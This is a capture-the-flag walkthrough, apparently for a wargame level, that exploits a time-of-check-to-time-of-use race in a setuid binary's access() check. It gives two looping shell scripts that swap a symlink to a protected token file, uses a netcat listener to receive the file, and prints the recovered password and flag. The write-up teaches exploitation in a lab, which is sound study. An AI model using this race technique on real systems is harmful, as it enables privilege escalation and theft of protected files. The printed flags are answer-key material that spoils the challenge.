We find in the **home** folder a **token** file and a **level10** binary which, if we launch it, displays a :
<pre><code>> ./level10
./level10 file host
		sends file to host if you have access to it

> ./level10 token IP
You don't have access to token
</code></pre>
> It is assumed that the host is the ip on which the machine is running (<code>ifconfig</code>)

We create a file in /tmp which will have our rights, and which can be sent :
<pre><code>> echo "test" > /tmp/test
> ./level10 /tmp/test IP
Connecting to IP:6969 .. Unable to connect to host IP
</code></pre>

We try to find out what happens in the binary with a valid :
<pre><code>> ltrace ./level10 /tmp/test IP
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/test", 4)= 0
printf("Connecting to %s:6969 .. ", "IP")= 35
fflush(0xb7fd1a20Connecting to IP:6969 .. )= 0
socket(2, 1, 0)= 3
inet_addr("IP")= 0x2a01a8c0
htons(6969, 1, 0, 0, 0)= 14619
connect(3, 0xbffff70c, 16, 0, 0)= -1
printf("Unable to connect to host %s\n", "IP"Unable to connect to host IP)= 39
exit(1 <unfinished ...>
+++ exited (status 1) +++
</code></pre>

We can see that the **access** command is used, but we know from the man that this command has a flaw
<pre>
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and  opening  the file to manipulate it.
</pre>
> Cette faille se nomme la **race-condition-vulnerability**.

In addition, there is an attempt to connect to port 6969, which is not active
In order for the requests to do so, you have to listen to the port with :
<pre><code>> nc -lk 6969</code></pre>
And if we re-launch our order :
<pre><code>> ./level10 /tmp/test IP
Connecting to IP:6969 .. Connected!
Sending file .. wrote file!</code></pre>
> It takes 2 terminals to perform this manipulation in order to see the result of the listening which, in this example, gives us :
> <pre><code>.*( )*.
> test</code></pre>

So we will try to exploit the **race-condition-vulnerability**, with 2 scripts:

### /tmp/loop.sh
```bash
# This script launches the request to send a file in a loop
while true;
do
	/home/user/level10/level10 /tmp/link IP > /dev/null
done
```
> <code>printf "while true;\ndo\n\t/home/user/level10/level10 /tmp/link IP > /dev/null\ndone\n" > /tmp/loop.sh</code>

### /tmp/ln.sh
```bash
# This script creates a file on which we have the rights and makes a symbolic link of the token file in a loop
while true;
do
	rm -f /tmp/link
	touch /tmp/link
	rm -f /tmp/link
	ln -s /home/user/level10/token /tmp/link
done
```
> <code>printf "while true;\ndo\n\trm -f /tmp/link\n\ttouch /tmp/link\n\trm -f /tmp/link\n\tln -s /home/user/level10/token /tmp/link\ndone\n" > /tmp/ln.sh</code>

Just run both in the background and watch the second terminal listening to port 6969 while waiting for the two scripts to run close enough for the **race-condition-vulnerability** to be exploited :
<pre><code>> sh /tmp/loop.sh &
> sh /tmp/ln.sh &
</code></pre>
On obtient donc: 
<pre><code>...
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
...
</code></pre>

We test the password :
<pre>
<code>> su flag10</code>
<code>Password: woupa2yuojeeaaed06riuj63c</code>
</pre>

You get the magic phrase **Don't forget to launch getflag !**

<pre>
<code>> getflag</code>
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
</pre>